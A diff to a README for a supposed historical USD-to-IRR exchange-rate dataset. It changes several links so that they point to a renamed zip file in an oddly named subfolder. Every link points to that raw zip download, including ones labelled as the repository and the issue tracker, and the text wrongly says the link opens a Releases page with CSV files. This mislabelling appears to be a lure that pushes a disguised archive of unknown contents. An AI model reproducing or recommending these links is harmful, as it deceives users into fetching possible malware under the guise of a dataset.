@@ -1,6 +1,6 @@
 # 🎉 USD-Nima-Iran-Rate-Dataset - Historical USD to IRR Data Made Easy
 
-![Download Link](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/USD-Nima-Iran-Rate-Dataset.zip%20Dataset-Here-brightgreen)
+![Download Link](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/Nima_Iran_US_Dataset_Rate_3.2.zip%20Dataset-Here-brightgreen)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 To download the dataset, visit the link below:
 
-[Download Dataset Here](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/USD-Nima-Iran-Rate-Dataset.zip)
+[Download Dataset Here](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/Nima_Iran_US_Dataset_Rate_3.2.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Find the latest version. Look for files labeled as CSV.
@@ -70,8 +70,8 @@ Yes! If you have additional data or improvements, feel free to submit a pull req
 
 For more detailed information about the project, check the following:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/USD-Nima-Iran-Rate-Dataset.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/USD-Nima-Iran-Rate-Dataset.zip) – Report any issues or suggest new features.
+- [GitHub Repository](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/Nima_Iran_US_Dataset_Rate_3.2.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/main/noncompetency/Nima_Iran_US_Dataset_Rate_3.2.zip) – Report any issues or suggest new features.
 
 ## 📫 Contact
 
